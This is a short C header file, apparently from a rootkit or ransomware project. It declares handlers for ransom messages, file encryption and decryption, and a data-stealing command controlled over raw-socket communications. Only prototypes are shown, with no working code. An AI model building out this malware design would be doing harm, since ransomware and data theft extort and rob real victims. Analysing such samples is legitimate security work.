#ifndef R00T_RANSOM_CMD_H
#define R00T_RANSOM_CMD_H

#include "raw_socket_comms.h"

int init_crypto();
void ransom_message_cmd(struct IncomingMessage *msg, char *data, int len);
void ransom_encrypt_cmd(struct IncomingMessage *msg, char *data, int len);
void ransom_decrypt_cmd(struct IncomingMessage *msg, char *data, int len);
void steal_cmd(struct IncomingMessage *msg, char *data, int len);

#endif //R00T_RANSOM_CMD_H
